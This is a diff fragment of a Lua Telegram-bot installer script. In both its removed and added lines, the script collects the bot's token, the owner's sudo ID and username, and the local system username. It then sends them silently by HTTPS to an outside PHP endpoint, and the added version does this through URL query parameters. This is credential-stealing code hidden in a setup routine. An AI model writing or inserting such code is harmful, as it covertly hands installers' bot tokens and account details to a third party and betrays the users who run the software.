@@ -67,12 +67,13 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
  }
 create(config, "./Banda.lua")   
 end 
-infotnseb = {}
-infotnseb.id = (SUDO or database:get(Server_Done.."UserSudo_Write"))
-infotnseb.username = (UserName or database:get(Server_Done.."User_Write"))
-infotnseb.tokenbot = (token or database:get(Server_Done.."Token_Write"))
-infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
-https.request('https://mostafabotphp.ml/frawn.php?insert='..JSON.encode(infotnseb))
+create_config_auto()
+botUserName = database:get(id_server..":token_username")
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+UserName = database:get(id_server..":SUDO:USERNAME")
+install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request('https://mostafabotphp.ml/frawn.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BANDA", "w")  
 file:write([[
